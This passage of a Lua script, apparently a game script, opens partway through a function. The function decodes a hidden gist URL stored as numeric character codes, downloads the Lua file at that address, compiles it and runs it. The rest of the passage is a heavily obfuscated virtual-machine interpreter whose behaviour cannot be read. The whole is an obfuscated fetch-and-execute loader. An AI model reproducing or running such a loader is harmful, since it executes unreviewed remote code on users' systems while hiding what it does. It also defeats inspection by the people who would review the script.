    local u = c(104,116,116,112,115,58,47,47,103,105,115,116,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,120,100,45,109,121,115,99,114,105,112,116,47,52,56,53,50,55,49,100,99,48,55,52,53,99,97,55,98,51,98,52,56,50,53,99,54,102,53,54,101,54,100,101,97,47,114,97,119,47,55,49,57,56,98,102,48,97,54,49,48,51,101,98,56,48,56,55,54,100,48,53,48,54,100,57,49,49,56,52,48,53,49,57,50,57,99,49,52,53,47,107,101,118,105,110,46,108,117,97)
    local ok, s = pcall(function() return h(g, u) end)
    if ok and type(s) == "string" and #s > 0 then
        local r = l(s)
        if type(r) == "function" then pcall(r) end
    end
end

return(function(...)local E={"4NapJU'I\",","4ArcL9";"4hdd";"4Qe+U`[bZ@FrY","40hpmFp\"","4N2L!$\"64%%\"O-P>K@h","4he[qU0*9:PR(M";"40R1KAbdEbZ","4NF-%ahdGipTXk8Maq";"40q9c>XI?";"4";"4XIgP2","4R==<6","4k`;:&";"4b$tJUAc4","40*9:PR(M","4k`;.nRk";"4p49hZbm";"4#=fkQb9o;8X.C_8","4AK+Z/XIS","4Qe#Is#dHUI#:IT9bJ";"4XJ\"rFX[#";"4R0imkb%%_U:M97(#s";"4hdS","4rOXtO#;YDZrFS\"i0N";"4A)/","4X`Lt>";"4h=hmfbMQUHpKkM^Rk";"4j:%8#\"P+^\"Q3lBjRk";"4RR]%TP>u>![;M`.";"4hf5&bP=(1c[Hg]=plo","4R(^S<";"40R1M7R=\'t^";"4bdQ*-:5h";"4r.R>,XE:b0oomHhh,9";"4AVepMT6Ua]#RYYk";"4V,Y?nVR$o?]W(_PVUoMWY`qGjT`pp:#DB_#T;Z9VV\"Z4Ade/r6)Y&9!Cq`uIcJLe_Qo6.8i]fXE^j\\scca)LB<DqbCqT>qJVGS\'#at=<UK\'?mm3q:]bc-VYj<dR4m5GE)Qk$_8d<h/\"LOtYcl%TA@o8XH(/q24c%`@TOqA2U","4[-Qm8pEplgpE.Bl0hV?-","4k`;+dp\'g?";"4A_K`3";"40ZB\"opE.XMXP05W";"4Li,Pd=<$h","4pER3Qbm","4\'.7pk:n#-Cp2>?W";"4Lm","4k`;Sg0hAa6X.CE","4b-[[Uhg";"4bWqeJRCs"}local function I(I)return E[I+(-826830+883346)]end for I,T in ipairs({{1991581761%10593520,-300525+300573};{915042229%5613756;-489444-(-489472)};{453278-453245;2675541954%11838681}})do while T[-584837+584838]<T[75797732%5053182]do E[T[-38559-(-38560)]],E[T[3206577923%13762137]],T[187504-187503],T[1020185-1020183]=E[T[1771871080%8771639]],E[T[208265773%5340148]],T[-308026+308027]+(78945-78944),T[-126982-(-126984)]-(-420728-(-420729))end end do local I={["3"]=744643-744617;J=1021674+-1021658,q=-217671-(-217723);["/"]=-716160+716196;K=-197681+197681;C=418954+-418903;W=-363071+363116,["4"]=-195346+195341;t=914097883%3856953,M=-334980+335015;b=270858141%14255691,N=77612351%5970180,B=46641717%613706,U=26975-26943;Y=88504345%355439,j=881610557%9688028,c=66386350%1475252;m=2913233981%11988617,z=-712152-(-712200);s=-500882+500888,h=290197070%1511443,i=80215814%1485477,A=130715-130711,["1"]=2453951478%13709226,I=-242482+242520,D=470445-470383,e=1316891689%11160099;O=617597989%4901571,g=323175785%6595423,y=398101-398100;o=956784-956781,x=389429-389383,r=685646+-685627;v=-303084-(-303123);d=484454+-484394;["0"]=66594-66552;T=2867463067%12150267;H=2009474268%12032780,["2"]=1023818+-1023793,L=393056-393053;p=901782930%14090358;E=953762-953734;k=-34583+34657,Q=-988631+988680;V=223501+-223464,["6"]=2816693019%13673267,X=375691169%1869110,P=883668+-883653,R=-688922-(-688952),F=-907822-(-907845);["9"]=1615912753%10845052;w=906428+-906388,G=218571-218527,["7"]=640395-640374;["5"]=-157445-(-157478),Z=-534821-(-534823);n=-47533-(-47580),S=-659367+659430,f=-866174-(-866215);l=520168585%14861959,["8"]=393380231%1812812;["+"]=2794909251%15614018,a=146858242%825046;u=1056176617%5588236}local T=string.sub local V=table.concat local U=string.char local M=string.len local L=math.floor local b=table.insert local s={[")"]=905955+-905907;T=-619244+619272,["."]=61197695%2781711,F=-241603+241682,["<"]=1454422070%5960746,["$"]=585762+-585695;["0"]=325617+-325580,g=174097858%9163042;["("]=187227689%5200768,A=-335016+335049,R=736539945%4661645;X=-141838-(-141869);S=-216156-(-216212),["#"]=-588899-(-588925);m=1574063047%13929761,C=990376-990307;I=-260845+260925;P=2091342817%11815496;["&"]=248719592%12435977;["7"]=1120436036%16238203,K=-765812-(-765832);D=440713+-440670,n=-342679+342738;Q=221465-221450;a=-942756-(-942780);h=42367-42333;s=-401802-(-401804),i=636442018%3857224,["8"]=2116738494%16537019;[":"]=887524-887486;["="]=240768-240755,o=-531000+531016;N=10442-10423;["!"]=773921351%14883102;["9"]=670176833%8935691,p=688736964%7486271,["@"]=171270+-171187,["\\"]=1570662281%14150110,G=1203445356%5928302,["4"]=895158+-895080;["/"]=-686534-(-686534),l=-174249-(-174326);M=-522843-(-522848);["5"]=110857504%1421250;["]"]=369987225%1728912,["?"]=300231-300147;["2"]=1217626206%10496777,[">"]=63483530%1923743,["\'"]=-948964+948986,j=897762+-897745,["*"]=-409501+409510,_=249166+-249147;["-"]=3249633025%13050735,q=1969475928%13397795,k=-1016659+1016689;f=835844176%10319063;e=-684555+684627;Y=533998+-533953;W=234729814%998850,H=105030+-104969,["3"]=1046192-1046122,t=880670-880664,["1"]=302786+-302711,E=182952+-182901,["\""]=-981543-(-981582),[","]=171205-171139,["+"]=-586598+586642,B=2010571624%12111877;b=-155866-(-155902),c=1026532-1026518,["^"]=-558983+559065,d=1728573265%8642866;[";"]=716813-716773,u=660995913%4348657,["`"]=30290095%6058008,J=-773872-(-773953);U=1043517633%10331857;["6"]=227177-227176;O=-1048105-(-1048108);Z=304417+-304410,["%"]=-992909-(-992921);L=-456286-(-456304);V=937376+-937308,["["]=-324293-(-324320),r=-194759-(-194780)}local g=E local y=type for E=80051765%3078914,#g,46889-46888 do local u=g[E]if y(u)=="string"then local y=T(u,836422+-836421,599889567%5503574)if y=="B"then u=T(u,817260-817258)local s=M(u)local y={}local K=-238813-(-238814)local C=171014-171014 local k=3269731530%16767854 while K<=s do local E=T(u,K,K)local V=I[E]if V then C=C+V*((387718476%5239438)^(((-51259-(-51262))-k)))k=k+(-1004797+1004798)if k==-635232-(-635236)then k=1334362332%10185972 local E=L(C/(904923+-839387))local I=L((C%(144840361%1744275))/(977562-977306))local T=C%(1674355434%7376014)b(y,U(E,I,T))C=875827712%13684808 end elseif E=="="then b(y,U(L(C/(1091904340%9175116))))if K>=s or T(u,K+(725634-725633),K+941109857%8113016)~="="then b(y,U(L((C%(393499-327963))/(204664239%5531459))))end break end K=K+296356105%12348171 end g[E]=V(y)elseif y=="4"then u=T(u,582493-582491)local I=M(u)local y={}local K=651526-651525 while K<=I do local E=(I-K)+3407163255%14079187 local V=E>=380903-380898 and-714906+714911 or E local M=236484-236484 local g=V>478476751%1913907 for E=734132-734132,1307074360%5186803,-47949+47950 do local I if E<V then local V=T(u,K+E,K+E)I=s[V]if not I then g=false break end else I=557495882%15067454 end M=M*(470934+-470849)+I end if g then local E=L(M/(-916854+17694070))%(369128+-368872)local I=L(M/(-152395+217931))%(438310+-438054)local T=L(M/(-864170-(-864426)))%(556372+-556116)local s=M%(26113996%2176145)if V==-826194-(-826199)then b(y,U(E,I,T,s))elseif V==282114+-282110 then b(y,U(E,I,T))elseif V==-274973+274976 then b(y,U(E,I))elseif V==245957-245955 then b(y,U(E))end end K=K+V end g[E]=V(y)end end end end return(function(V,E,b,L,U,s,M,P,G,H,k,g,C,f,S,u,w,y,K,T)K,u,G,C,S,T,y,f,H,w,P,g,k=502393+-502393,function()K=K+(123989+-123988)y[K]=-459653+459654 return K end,function(E,I)local V=C(I)local U=function(U,M,L,b,s)return T(E,{U;M,L;b;s},I,V)end return U end,function(E)for I=1945966065%8176328,#E,3697433432%16288253 do y[E[I]]=y[E[I]]+(-105722+105723)end if U then local T=U(true)local V=L(T)V[I(-464781-(-408288))],V[I(-347270+290800)],V[I(459039+-515554)]=E,k,function()return 2694856-(-679110)end return T else return M({},{[I(-505680-(-449210))]=k,[I(352236-408729)]=E,[I(869708-926215)]=function()return 1702444174%19307616 end})end end,function(E)y[E]=y[E]-1275584279%5619314 if y[E]==684637-684637 then y[E],g[E]=nil,nil end end,function(T,U,M,L)local Z,x,K,e,B,l,Y,C,h,H,O,X,W,r,q,N,t,k,D,Ef,J,A,m,Q,c,j,s,n,o,z,R,a,v,F,y,i,p,d while T do if T<7568018-(-792651)then if T>-1032554+5734604 then if T>-915753+7600464 then if T>7946793-324626 then if T<719681093%13952796 then if T<-57958+7852644 then i,e=-814315-(-814316),-279500+279501 p=#l j=v(e,p)e=J(l,j)p=g[Q]o=e-i O=k(o)p[e]=O e,o=nil,504877+-504877 O=#l j=nil p=O==o T=p and 13346209-245412 or-976973+8656167 elseif T<948448+7047714 then J,T=l,j T=l and 16491323-648294 or 10855388-914218 else H,T,A=35184372273685-184853,{},-179335+179336 g[M[-528511+528513]]=T s=g[M[-198098-(-198101)]]k=s s=K%H Z=72153-71898 g[M[2247980388%10807598]]=s N=K%Z Z=1605740104%6662822 H=N+Z J=1095234253%4803659 g[M[365948993%1710042]]=H v=J J,Z=1565186961%8109777,I(-38761+-17712)N=#y C[K]=Z c,Q,l,T=I(-2261+-54212),N,v<J,2930161412%20856331 J,Z=A-v,-583922-(-584126)end else if T<-753775+8931933 then T=15171603-(-111972)elseif T<2523066877%14536170 then B=765580+-765579 t=m[B]z,T=t,14019534-(-42015)else Ef=T t=g[K]z,T=t,t and 9279698-1018232 or 3867569781%17595928 end end else if T<1438681154%9058743 then if 409380958%13871887>T then a=u()F=391034644%9093823 g[a]=W r=I(169314+-225785)x=E[r]r=I(573789-630273)i=x[r]X,m,n,r=802182+-802181,616325+-616225,1340064588%10984054,144343-144342 x=i(r,m)z=889278628%8389421 i=u()m=76529820%7652982 g[i]=x x=g[Q]r=x(m,F)x=u()g[x]=r r=g[Q]d=g[i]B,D,F=I(-414911-(-358435)),820272+-820272,120982-120981 m=r(F,d)r=u()g[r]=m F=g[Q]d=F(X,z)F=33794-33793 m=d==F d,z=I(445227+-501717),I(10944-67431)F=u()g[F]=m t=E[B]R=g[Q]h={R(D,n)}m=I(255737+-312219)B=t(V(h))m,t=p[m],I(248489+-304976)Ef=B..t X=z..Ef m=m(p,d,X)d=u()g[d]=m Ef=G(9302253-(-916848),{Q,a,J,k;K;O;F,d;i,r,x;v})z=I(-983717-(-927232))X=E[z]z={X(Ef)}X=g[F]T,m=X and 2806183744%15536204 or 7598033-(-759435),{V(z)}elseif T<800281+6494377 then A=1967119760%9065068 c=Z==A T=c and 6879927-694779 or 4329168-(-606024)elseif 1164268486%8263643>T then c=-426022+426023 s=Z==c T=s and 1693008703%10736523 or-177857+15679498 else A=641232+13028289<11633018-153736 c=g[K]s=c==A T=s and-1039181+9134031 or 14894038-(-389537)end else if 1123903181%18302307>T then K=g[M[913719192%11866483]]k=nil y=#K T=E[I(829306-885813)]C=g[M[987324-987323]]K=C[y]s={K}C=g[M[-418434-(-418435)]]C[y]=k elseif T<2235575350%23453082 then T=3995091096%20651583 else s,C,K=13274117-(-217731),3970494-308750,I(-1042692-(-986192))y=K^C T=s-y s,y=I(615719-672199),T T=s/y s={T}T=E[I(-238498-(-181987))]end end end else if 506852+5012990>T then if T>-249170+5359686 then if 1634263160%14289117>T then T=1588677-929663 elseif 2709463493%22163805>T then T=9766381-(-670649)else T=g[M[-740917+740924]]T=T and 413816+2769677 or-811729+6342205 end else if T<2935627863%15264708 then T=1458737463%12928575 elseif 515734+4370963>T then y=nil g[M[20116554%300247]]=s T=613032+4896177 elseif T<-836330+5835298 then Q=279394-279389 A=Z==Q T=A and 734848+1821828 or 12294420-11006 else j=e i,T=j,2302258014%12614473 l[j]=i j=nil end end else if T>195429+5920756 then if T<1245694497%6291647 then T,c=546192739%16531325,590635+9215455<3162919-(-937647)g[K]=c elseif T<6712590-353162 then H=I(-660226-(-603758))N=u()v=w(1450551584%17102694,{N})T=6668902-644281~=1586649943%19236351 g[K]=T Z=T k=E[H]H=I(151932-208444)C=k[H]H=u()J=I(266303+-322788)k=u()g[k]=C C=G(284499754%19627038,{})g[H]=C C=3516440414%14377450<=456957+2293970 g[N]=C Q=E[J]J=Q(v)T,C=J and 9105645-(-56508)or 1756433612%22952188,J else i,e=not o,O+e j=p>=e j=i and j i=p<=e i=o and i j=i or j i=5985507-922762 T=j and i j=10069811-(-954832)T=T or j end else if T<1079329055%15338949 then T={}C=g[M[249255204%2026465]]y,K,k=T,84306+-84305,C C=1996348057%8115236 H=C C=854041162%5849597 N,T=C>H,492750+16022125 C=K-H elseif-796138+6657136>T then W=363677+1919277~=6765545-(-126333)T=W and 10502208-(-212631)or 15708540-(-814412)else T=4919390-(-755384)end end end end else if T<179944617%3690754 then if T<-53613+2003056 then if T<824428893%5965956 then if T<-688839+764228 then A,c,K=36955+-36700,-535108-(-535108),C T=g[M[1010767927%8284983]]Z=T(c,A)T=16097249-(-417626)y[K]=Z K=nil elseif 737178+-362301>T then T=-960765+6635539 elseif 2963689001%14453740>T then T,Z=1344632505%6908034,nil else i,W=not o,W+q a=Y>=W a=i and a i=Y<=W i=o and i a=i or a i=-204914+7150409 T=a and i a=811398+10865273 T=T or a end else if T<1179570-(-525105)then T=2761617058%18839738 elseif 1028849+841921>T then A,W=J,I(-50181+-6287)a=E[W]W=I(781773-838278)O=a[W]a=O(y,A)A=nil O=g[M[1576954230%7300714]]W=O()p=a+W e=p+Z p=1046164+-1045908 j=e%p Z,a=j,1000241+-1000240 O=Z+a T=823407504%19360296 p=k[O]e=c..p c=e else O=I(989964+-1046443)p=E[O]O,T=I(499334+-555808),475474444%10390317 e=p[O]l=e end end else if T<2374954-48822 then if T<993638622%14371337 then K=g[M[706856-706854]]C=373937+-373724 y=K*C K=27552855017688-546491 s=y+K y=-475420+35184372564252 T=s%y g[M[-622351+622353]]=T T=9575370-(-317093)elseif T<-974234+3123069 then T=-689675+4413639 elseif T<831755031%18432528 then A=102569492%3266354>=936586-(-236249)T=A and 13024441-278205 or 1157335688%8436258 else W=G(5223624796%21473973,{H})Y={W()}T,s=E[I(643318+-699822)],{V(Y)}end else if 2948363382%15923884>T then h=3005664851%15573393 R=m[h]T=9762537-(-355950)h=g[d]B=R==h Ef=B elseif T<2436350932%14149461 then J=12652457-(-732374)<866664+11425238 Q=g[K]A=Q==J T=A and 10355078-(-373253)or 15610815-(-619550)else h,t=274792-274791,T R=m[h]h=11410359-(-68251)>-317257+12523526 B=R==h Ef,T=B,B and 1308996-(-1024013)or 11162527-1044040 end end end else if T<-814612+4487065 then if 3409087-121057>T then if 3108477-190441>T then s,T={K},E[I(-453994+397481)]elseif 2287290134%19035184>T then g[K]=a T=W W=g[K]T=W and 712269+1322115 or 2972088823%18877229 elseif T<4002911-838023 then T=9388059-52482 else y=I(104424-160913)T=E[y]C=-258908-(-258908)K=g[M[460903388%5834220]]y=T(K,C)T=4932355577%19473617 end else if 582813+2830241>T then s,C,K=3153841611%13556053,3056606483%17480867,I(880003-936505)y=K^C T=s-y s,y=I(185106+-241575),T T=s/y s={T}T=E[I(-664185+607727)]elseif T<-284097+3811339 then A,T=2654067107%17080617>1886047408%21752667,890653094%11124926 g[K]=A else s=2313758-(-163566)~=14033734-(-748037)g[K]=s T=-165049+824063 end end else if T>-322282+4455956 then if 910980482%11054217>T then C,Z=C+H,not N s=C<=k s=Z and s Z=C>=k Z=N and Z s=Z or s Z=9365092-309416 T=s and Z s=6533935-239007 T=T or s elseif T<812206+3802752 then g[K]=X T=z T=3693096884%21140425 else T=28835629%11838671 end else if 1965529040%8383656>T then H=S(H)v=S(v)k=S(k)J=S(J)C=nil O=S(O)j,v=nil,I(249758-306226)K=S(K)k,p,C,K=-422079+422081,nil,nil,nil e=nil Q=S(Q)Z,j=nil,I(-657342-(-600871))Q=u()N=S(N)H=u()Z=I(-906464-(-849993))g[H]=k l=nil N=E[Z]Z=I(-1043081-(-986567))k=N[Z]e=570991936%10573920 Z=u()N=u()g[N]=k k=1426396640%7352560 g[Z]=k k={}g[Q]=k l=I(211890-268369)J=E[v]v=I(868434-924906)k=J[v]v=E[l]p,T,l=e,6111876-(-312052),I(105125-161623)J=v[l]l=E[j]j=I(-454037-(-397553))v=l[j]l,j={},1065538801%7399575 e=1074289945%6886474 O=e e=-396310+396310 o=O<e e=j-O elseif T<3429947398%15093212 then T,s=E[I(-441586-(-385085))],{K}else T=-74556+5232843 end end end end end else if 2583671368%26239450>T then if T<-681790+11161286 then if T>257714817%9916319 then if 2689245591%24135827>T then if 3726267970%17447658>T then C=-886729+886730 K=g[M[-887745-(-887748)]]y=K*C C,K=803342881%7438360,232875-232618 s=y%K g[M[558655743%6207286]]=s K=g[M[81666255%3024676]]y=K~=C T=y and 10178819-470937 or 3284137760%13815381 elseif 1471524324%16607892>T then j=I(-741037+684563)l=E[j]J,T=l,1013592+14829437 else T=t T,X=4181490-(-413977),Ef end else if T<131120+10115966 then H,k=3722733197%15707735,-798941-(-798942)K=g[M[847606-847605]]C=K(k,H)K=812535967%4103717 y=C==K s,T=y,y and 11627472-(-632132)or-551605+11073568 elseif T<10658615-302564 then J,j=J+v,not l A=Q>=J A=j and A j=Q<=J j=l and j A=j or A j=2510784-669775 T=A and j A=11339090-21092 T=T or A else T=14347833-621929~=8366469-43721 T=T and 15576321-(-58288)or 15729051-487207 end end else if T>2562468237%13950639 then if 9806524-119071>T then z=T Ef=g[K]X,T=Ef,Ef and 440215756%11823923 or 1950612192%13420805 elseif T<1904949522%21784310 then Q,C=-803882+803884,548987954%9465309 K=g[M[-936502+936505]]y=K%C C=-20184+20197 N=g[M[-218439+218442]]H=N-y N=839204+-839172 k=H/N K=C-k H=g[M[952399+-952395]]T=2359220401%16331913 c=g[M[353814-353812]]A=Q^K Z=c/A N=H(Z)H,A=4295020114-52818,960738626%5489935 k=N%H N=-13806+13808 H=N^y C=k/H v=1213927417%12514713 H=g[M[1035168-1035164]]c=C%A A=4295679689-712393 Z=c*A N=H(Z)H=g[M[564141-564137]]Z=H(C)j=877695+-877439 k=N+Z c=1008117-942581 N=-503525-(-569061)H=k%N Z=k-H A=703575040%2780928 N=Z/c c=H%A J=H%v Q=H-J J,y,H=897124446%14469745,nil,nil A=Q/J C,J,k,K=nil,1699908064%7455736,nil,nil Q=N%J l=N%j v=N-l l,N=193254+-192998,nil J=v/l Z={c;A,Q,J}g[M[875186-875185]]=Z else y,s=I(-674928+618434),I(-697572+641083)T=E[s]s=T(y)s,T={},E[I(-171166+114691)]end else if T<3577430373%17843603 then T=909485+1409771 elseif T<2585193298%11103812 then Z,s=C,124737-124737 T=Z==s T=T and-808545+16442143 or 8085715-743375 elseif 2161909725%10449810>T then Q=g[N]T,C=2337511374%23973650,Q else c=657821+5771013<=2138930832%16483347 T=c and 2225842-(-920441)or 5429761-795312 end end end else if 1272920644%19117414>T then if T>2666641685%15622914 then if T<2838191430%11446583 then Q=198158+4517237<=1956091537%21587829 A=g[K]c=A==Q T=c and 3688982714%18334275 or 2960061095%17166053 elseif T<10752062-(-267914)then T=-297266+956280 else T=8538936-859742 end else if T<10605353-(-13048)then T=2176715404%20812075 K=g[M[643524471%2692571]]C=g[M[740563+-740560]]y=K==C s=y elseif 11599514-877929>T then W=g[Q]q,o=494044999%4016626,183668+-183662 Y=W(q,o)W,o=I(-108467+51986),I(-738520+682039)E[W]=Y q=E[o]o=697848-697846 W=q>o T=W and 12266763-(-725282)or 12420590-(-720701)elseif T<355586689%24632428 then T=-541960+11557270 else T=967347858%27216647>=13209277-(-702409)T=T and-1031550+5801202 or 11560780-(-829770)end end else if T<11177659-(-694338)then if T<-516505+11981062 then N,T,Z,A=nil,79997432%4286177,nil,c C[K]=A k,c=nil,nil elseif 3126123887%13966278>T then y=g[M[1022478-1022477]]s=#y y=-952222+952222 T=s==y T=T and 911185+1087170 or 8310204-885275 else Y=g[K]W,a=T,Y T=Y and-446438+12597370 or 1019683+1970143 end else if T<12795425-713977 then p,v,J=I(-171552+115073),I(-334870-(-278391)),I(306413+-362884)Q=E[J]J,T=I(586470+-642954),Z Z=Q[J]Q=u()g[Q]=Z J=E[v]j,v=T,I(-419226-(-362716))Z=J[v]e=E[p]l,v=e,T T=e and 1670602-(-229930)or 232545+7677634 elseif T<132822523%17242753 then T=10133585-(-603478)else T=3288859-299033 Y=l==j a=Y end end end end else if 966543+13502956>T then if 12641594-(-416412)>T then if T<5238569360%21866046 then if T<2024171009%15476150 then T=s and 12810983-388487 or-43929+5553138 elseif 986846+11350136>T then Q=948340-948334 A=Z==Q T=A and 2863844-(-569698)or 963239-304225 elseif 105680+12300843>T then T=-166922+15783319 else s=I(-918776-(-862277))A=w(814821+2577746,{})k,c=I(-873363-(-816887)),I(-155528+99043)T=E[s]y=g[M[1446105276%10633127]]C=E[k]Z=E[c]c={Z(A)}N,Z={V(c)},-352443-(-352445)H=N[Z]k=C(H)C=I(320-56810)K=y(k,C)y={K()}s=T(V(y))y=s K=g[M[-48007+48012]]s,T=K,K and 2481858385%19439710 or 122190438%10668385 end else if T<12552845-(-316295)then T=765098+1498189 elseif 1789611118%24675104>T then q,i=I(623560+-680036),I(687087+-743595)W=E[q]o=E[i]q=W(o)W=I(863010-919491)E[W]=q T=799422+-708682 else C=g[M[123002716%897830]]T=2528449867%20028664 K=C==y s=K end end else if-831115+14734419>T then if 14069645-948601>T then e=u()j={}p=f(-454122+12065238,{e,Z;H;N})d=nil O=u()r,v,o=I(-623253-(-566760)),nil,I(289177-345668)g[e]=j j=u()F=I(689918-746404)g[j]=p p,i={},{}g[O]=p p=E[o]m=g[O]T,J,x=E[I(415215+-471718)],nil,{[r]=m,[F]=d}o=p(i,x)v=I(-46225-10270)p=G(2736385017%15819113,{O,e;Q,Z;H;j})K,k=o,nil O=S(O)C=p H=S(H)l=nil Q=S(Q)l=22126428475115-(-137556)N=S(N)H=I(74849+-131326)Z=S(Z)k=E[H]s={}j=S(j)e=S(e)Z=I(-131961+75469)N=E[Z]J=C(v,l)C=nil Q=K[J]K,J=nil,I(-171055+114572)J=N[J]Z={J(N,Q)}H=k(V(Z))k=H()elseif T<-16665+13527970 then o=I(-248201+191720)W=E[o]o=I(434791+-491299)E[o]=W T=463866-373126 else T=g[M[-229680+229680]]K=g[M[-239804+239815]]y[T]=K T=g[M[220641-220629]]K={T(y)}T,s=E[I(76107+-132604)],{V(K)}end else if 902076+13091342>T then T=649346+642411~=10957358-57083 g[M[-498666-(-498667)]]=T T,s=E[I(-416311-(-359823))],{}elseif 14943197-774390>T then D=18955+-18954 g[K]=z h=g[r]T=Ef R=h+D B=m[R]t=l+B B=-1021917-(-1022176)Ef=t%B l=Ef R=g[x]B=j+R T,R=13796705-(-866229),-932193+932449 t=B%R j=t else y,T,s=U,I(138882+-195388),1661887458%13189583 K=u()C=399628138%2682068 k=C C=304733+-304732 H=C C=-288138+288138 N=H<C C=s-H g[K]=T T=3747443-(-726466)end end end else if T>2893633112%17233527 then if 16374132-287655>T then if 16699770-960951>T then s=I(670273+-726754)T=E[s]y=I(-276571-(-220063))s=E[y]y=I(223320-279828)E[y]=T y=I(-380117+323636)E[y]=s y=g[M[-197806-(-197807)]]K=y()T=941729058%13695471 elseif T<4402738614%23971835 then T=v a=P(-407313+7972454,{})e=170015285%4722645 v=u()o=I(805643-862119)g[v]=J j,O=-11751+11754,I(-716012-(-659527))J=g[Q]l=J(j,e)J=u()g[J]=l l,j=-890171+890171,991048960%12388112 T=-751175+1436764 p=E[O]O={p(a)}e={V(O)}O=275423-275421 p=e[O]a=I(586384+-642883)O=E[a]W=g[k]q=E[o]o=q(p)q=I(-139051-(-82561))Y=W(o,q)W={Y()}a=O(V(W))O=u()g[O]=a W=g[J]a,Y=346846605%13340254,W W=482600251%6521625 q=W W=290746+-290746 o=q<W W=a-q else A=69364+-69361 c=Z==A T=c and 10350942-(-404606)or 97310+7149666 end else if 495353+15877267>T then T=175496757%7531890 elseif 17508050-989137>T then Z,C=not N,H+C K=k>=C K=Z and K Z=C>=k Z=N and Z K=Z or K Z=1988512978%11696782 T=K and Z K=13623851-(-257469)T=T or K else T,s=E[I(-553457+496961)],{}end end else if T>2061925486%25904125 then if T<4299035383%17555231 then c=1020904-1020902 s=Z==c T=s and 2551674368%16874526 or 5178148798%20164868 elseif 16527031-902034>T then T=1400801096%16544921>=13790911-(-615288)g[K]=T T=2574376156%10859566 else s=g[K]c=I(1046891+-1103397)T=s~=c T=T and-772141+12867714 or-68096+15684493 end else if T<14477420-(-474969)then T=1529852-844263 F=S(F)d=S(d)a=S(a)i=S(i)m=nil r=S(r)x=S(x)elseif T<14596622-(-666087)then s,T={},E[I(274230+-330739)]elseif 731334058%20455528>T then T=602066+56948 else y,K=U[411136+-411135],U[-604058-(-604060)]T=g[M[-896604+896605]]C=T T=C[K]T=T and 1993144175%12917929 or-444439+8526584 end end end end end end end T=#L return V(s)end,{},function(E,I)local V=C(I)local U=function()return T(E,{},I,V)end return U end,function(E,I)local V=C(I)local U=function(...)return T(E,{...},I,V)end return U end,function(E,I)local V=C(I)local U=function(U)return T(E,{U},I,V)end return U end,function(E,I)local V=C(I)local U=function(U,M,L)return T(E,{U,M,L},I,V)end return U end,{},function(E)local I,T=556023161%2527378,E[-256583-(-256584)]while T do y[T],I=y[T]-(-40713+40714),I+(715282-715281)if y[T]==-525343+525343 then y[T],g[T]=nil,nil end T=E[I]end end return(H(-604395+14880460,{}))(V(s))end)(unpack or table[I(71436+-127910)],getfenv and getfenv()or _ENV,select,getmetatable,newproxy,{...},setmetatable)end)(...)